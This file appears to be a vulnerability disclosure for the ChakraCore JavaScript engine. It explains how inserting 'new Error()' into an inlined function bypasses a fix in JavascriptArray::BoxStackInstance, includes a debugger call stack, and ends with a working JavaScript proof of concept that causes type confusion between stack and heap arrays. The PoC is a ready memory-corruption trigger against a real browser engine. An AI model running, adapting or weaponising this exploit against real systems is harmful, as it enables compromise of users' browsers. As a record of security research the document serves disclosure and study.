@@ -1,0 +1,102 @@
+/*
+Here's a snippet of JavascriptArray::BoxStackInstance.
+    template <typename T>
+    T * JavascriptArray::BoxStackInstance(T * instance, bool deepCopy)
+    {
+        Assert(ThreadContext::IsOnStack(instance));
+        // On the stack, the we reserved a pointer before the object as to store the boxed value
+        T ** boxedInstanceRef = ((T **)instance) - 1;
+        T * boxedInstance = *boxedInstanceRef;
+        if (boxedInstance)
+        {
+            return boxedInstance;
+        }
+
+        const size_t inlineSlotsSize = instance->GetTypeHandler()->GetInlineSlotsSize();
+        if (ThreadContext::IsOnStack(instance->head))
+        {
+            boxedInstance = RecyclerNewPlusZ(instance->GetRecycler(),
+                inlineSlotsSize + sizeof(Js::SparseArraySegmentBase) + instance->head->size * sizeof(typename T::TElement),
+                T, instance, true, deepCopy);
+        }
+        else if(inlineSlotsSize)
+        {
+            boxedInstance = RecyclerNewPlusZ(instance->GetRecycler(), inlineSlotsSize, T, instance, false, false);
+        }
+        else
+        {
+            boxedInstance = RecyclerNew(instance->GetRecycler(), T, instance, false, false);
+        }
+
+        *boxedInstanceRef = boxedInstance;
+        return boxedInstance;
+    }
+
+The method checks if the array has already been copied, and if so, it just returns the cached copied array stored in "boxedInstanceRef".
+
+My idea for bypassing the fix was:
+1. In any way, invoke the method with "deepCopy" set to false.
+2. From the next call, whatever the value of "deepCopy" is, the method will return the cached shallow-copied array.
+
+And I found out that the constructor of "Error" iterates over all the functions and arguments in the call stack and invokes "BoxStackInstance" with every argument and "deepCopy" set to false.
+
+Call stack to "JavascriptOperators::BoxStackInstance" from "new Error()":
+#0  Js::JavascriptOperators::BoxStackInstance (instance=0x7fffffff5bb8, scriptContext=0x5555561a8e78, allowStackFunction=0x0, deepCopy=0x0)
+    at ChakraCore/lib/Runtime/Language/JavascriptOperators.cpp:9801
+#1  0x00007ffff5d1834a in Js::InlinedFrameWalker::FinalizeStackValues (this=0x7fffffff57d8, args=0x7fffffff5b90, argCount=0x1)
+    at ChakraCore/lib/Runtime/Language/JavascriptStackWalker.cpp:1364
+#2  0x00007ffff5d13f11 in Js::InlinedFrameWalker::GetArgv (this=0x7fffffff57d8, includeThis=0x0) at ChakraCore/lib/Runtime/Language/JavascriptStackWalker.cpp:1353
+#3  0x00007ffff5d13d7b in Js::JavascriptStackWalker::GetJavascriptArgs (this=0x7fffffff57a8) at ChakraCore/lib/Runtime/Language/JavascriptStackWalker.cpp:273
+#4  0x00007ffff5d5426d in Js::StackTraceArguments::Init (this=0x7fffffff5710, walker=...) at ChakraCore/lib/Runtime/Language/StackTraceArguments.cpp:82
+#5  0x00007ffff5c98af8 in Js::JavascriptExceptionContext::StackFrame::StackFrame (this=0x7fffffff5700, func=0x7ffff7e402a0, walker=..., initArgumentTypes=0x1)
+    at ChakraCore/lib/Runtime/Language/JavascriptExceptionObject.cpp:168
+#6  0x00007ffff5c9afe7 in Js::JavascriptExceptionOperators::WalkStackForExceptionContextInternal (scriptContext=..., exceptionContext=..., thrownObject=0x7ff7f2b82980, 
+    callerByteCodeOffset=@0x7fffffff58b8: 0x0, stackCrawlLimit=0xffffffffffffffff, returnAddress=0x0, isThrownException=0x0, resetStack=0x0)
+    at ChakraCore/lib/Runtime/Language/JavascriptExceptionOperators.cpp:955
+#7  0x00007ffff5c9a70c in Js::JavascriptExceptionOperators::WalkStackForExceptionContext (scriptContext=..., exceptionContext=..., thrownObject=0x7ff7f2b82980, stackCrawlLimit=0xffffffffffffffff, 
+    returnAddress=0x0, isThrownException=0x0, resetSatck=0x0) at ChakraCore/lib/Runtime/Language/JavascriptExceptionOperators.cpp:883
+#8  0x00007ffff5e4460f in Js::JavascriptError::NewInstance (function=0x7ffff7ed17c0, pError=0x7ff7f2b82980, callInfo=..., newTarget=0x7ffff7ef16d0, message=0x7ffff7ee4030)
+    at ChakraCore/lib/Runtime/Library/JavascriptError.cpp:74
+#9  0x00007ffff5e44ad3 in Js::JavascriptError::NewErrorInstance (function=0x7ffff7ed17c0, callInfo=...) at ChakraCore/lib/Runtime/Library/JavascriptError.cpp:127
+
+
+I just needed to insert "new Error();" to the top of the "inlinee" function in the old PoC.
+
+PoC:
+*/
+
+// To test this using ch, you will need to add the flag -WERExceptionSupport which is enabled on Edge by default.
+
+function inlinee() {
+    new Error();
+    return inlinee.arguments[0];
+}
+
+function opt(convert_to_var_array) {
+    /*
+    To make the in-place type conversion happen, it requires to segment.
+    */
+
+    let stack_arr = [];  // JavascriptNativeFloatArray
+    stack_arr[10000] = 1.1;
+    stack_arr[20000] = 2.2;
+
+    let heap_arr = inlinee(stack_arr);
+    convert_to_var_array(heap_arr);
+
+    stack_arr[10000] = 2.3023e-320;
+
+    return heap_arr[10000];
+}
+
+function main() {
+    for (let i = 0; i < 10000; i++) {
+        opt(new Function(''));  // Prevents to be inlined
+    }
+
+    print(opt(heap_arr => {
+        heap_arr[10000] = {};  // ConvertToVarArray
+    }));
+}
+
+main();
